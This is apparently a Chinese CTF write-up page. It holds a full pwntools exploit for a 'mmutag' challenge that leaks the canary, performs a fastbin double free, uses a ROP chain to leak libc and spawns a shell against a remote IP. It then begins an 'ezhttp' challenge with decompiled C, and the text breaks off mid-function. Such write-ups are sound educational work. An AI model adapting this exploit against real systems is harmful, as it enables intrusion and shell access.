<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"><span class="comment"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;mmutag.bk&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;183.129.189.61&quot;</span></span><br><span class="line">server_port = <span class="number">55304</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">i, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sa(<span class="string">&#x27;content&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span>	</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intro</span>(<span class="params">d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;duce&#x27;</span>, d)</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;i0gan&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	stack_leak  = <span class="built_in">int</span>(ru(<span class="string">&#x27;:&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">	attack_stack = stack_leak - (<span class="number">0x7fffffffed40</span> - <span class="number">0x7fffffffecd8</span>) +<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	s(<span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\x21&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;\x21&#x27;</span>)</span><br><span class="line">	cannary = u64(<span class="string">&#x27;\x00&#x27;</span> + ru(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>:<span class="number">7</span>])</span><br><span class="line">	li(<span class="string">&#x27;cannary: &#x27;</span> + <span class="built_in">hex</span>(cannary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sl(p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#leak = u64(ru(&#x27;\x7f&#x27;)[-5:] + &#x27;\x7f\x00\x00&#x27;)</span></span><br><span class="line">	<span class="comment">#libc_base = leak - ( 0x7fffffffed20 - 0x7ffff7a0d000)</span></span><br><span class="line">	<span class="comment">#li(&#x27;leak: &#x27; + hex(leak))</span></span><br><span class="line">	<span class="comment">#li(&#x27;libc_base: &#x27; + hex(libc_base))</span></span><br><span class="line">	</span><br><span class="line">	ad(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x68</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x68</span>)</span><br><span class="line">	ad(<span class="number">3</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	p_addr = <span class="number">0x6020C0</span></span><br><span class="line">	bss_target = p_addr - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">4</span>, p64(attack_stack))</span><br><span class="line">	ad(<span class="number">5</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">6</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;target : &#x27;</span> + <span class="built_in">hex</span>(attack_stack))</span><br><span class="line">	<span class="comment"># attack to stack</span></span><br><span class="line">	pop_rdi = <span class="number">0x400d23</span></span><br><span class="line">	ret_again = <span class="number">0x400A50</span></span><br><span class="line">	ret_again = <span class="number">0x400B44</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">	p += p64(cannary)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>] + <span class="number">0x20</span>)</span><br><span class="line">	p += p64(pop_rdi)</span><br><span class="line">	p += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">	p += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">	p += p64(ret_again)</span><br><span class="line">	<span class="comment">#p += p64(0x400942)</span></span><br><span class="line">	ad(<span class="number">7</span>, p)</span><br><span class="line"></span><br><span class="line">	q()	</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	libc_sys = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	p = p64(libc_sys)</span><br><span class="line">	s(p)</span><br><span class="line">	</span><br><span class="line">	sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="ezhttp-思路1"><a href="#ezhttp-思路1" class="headerlink" title="ezhttp 思路1"></a>ezhttp 思路1</h2><p><a target="_blank" rel="noopener" href="https://github.com/i0gan/">本题下载</a></p>
<h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>该程序是一个模拟http协议进行交互的程序, 开启了pie, 沙箱, 所以只能使用传统的row来打了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int16 *v2; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+32h] [rbp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v23; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v23 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">21</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">59</span>;</span><br><span class="line">  v11 = <span class="number">53</span>;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">6</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">6</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">2147418112</span>;</span><br><span class="line">  v1 = <span class="number">5</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, <span class="number">0L</span>L, *(_QWORD *)&amp;v1, &amp;v3, <span class="number">32L</span>L, *(_QWORD *)&amp;v7, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;v11, <span class="number">6L</span>L, *(_QWORD *)&amp;v19);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v23;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *cont; <span class="comment">// [rsp+8h] [rbp-1838h]</span></span><br><span class="line">  <span class="keyword">char</span> method; <span class="comment">// [rsp+10h] [rbp-1830h]</span></span><br><span class="line">  <span class="keyword">char</span> url; <span class="comment">// [rsp+20h] [rbp-1820h]</span></span><br><span class="line">  <span class="keyword">char</span> content; <span class="comment">// [rsp+30h] [rbp-1810h]</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [rsp+830h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+1838h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_DF0(a1, a2, a3);</span><br><span class="line">  sub_E4B();</span><br><span class="line">  sandbox();</span><br><span class="line">  sub_F42();</span><br><span class="line">  <span class="keyword">while</span> ( True )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n======= Send Http packet to me: ========&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;input, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;input, <span class="number">0x1000</span>uLL) &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Server error!&quot;</span>);</span><br><span class="line">    __isoc99_sscanf(&amp;input, <span class="string">&quot;%s %s %s&quot;</span>, &amp;method, &amp;url, &amp;content);</span><br><span class="line">    cont = get_end(&amp;input);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;method, <span class="string">&quot;GET&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(&amp;method, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      send_to((__int64)<span class="string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>, (__int64)<span class="string">&quot;Method not allowed&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(&amp;input, <span class="string">&quot;Cookie: &quot;</span>) || !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)check(&amp;input) )</span><br><span class="line">    &#123;</span><br><span class="line">      send_to((__int64)<span class="string">&quot;HTTP/1.1 401 Unauthorized&quot;</span>, (__int64)<span class="string">&quot;You not login!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;url, <span class="string">&quot;/&quot;</span>) )</span><br><span class="line">      send_to((__int64)<span class="string">&quot;HTTP/1.1 200 OK&quot;</span>, (__int64)<span class="string">&quot;Hello admin!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;method, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;url, <span class="string">&quot;/create&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        add(cont);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;url, <span class="string">&quot;/del&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        del((__int64)cont);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;url, <span class="string">&quot;/show&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        show();                                 <span class="comment">// nothing</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;url, <span class="string">&quot;/edit&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        edit(cont);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        send_to((__int64)<span class="string">&quot;HTTP/1.1 404 NOT FOUND&quot;</span>, (__int64)<span class="string">&quot;page not found!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>有token和cookie检查, 交互之前需要绕过.</p>
<p>检查函数:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r8</span></span><br><span class="line">  _BOOL8 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> *token; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+30h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> u; <span class="comment">// [rsp+40h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;u, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  v4 = <span class="built_in">strstr</span>(a1, <span class="string">&quot;Cookie: &quot;</span>) + 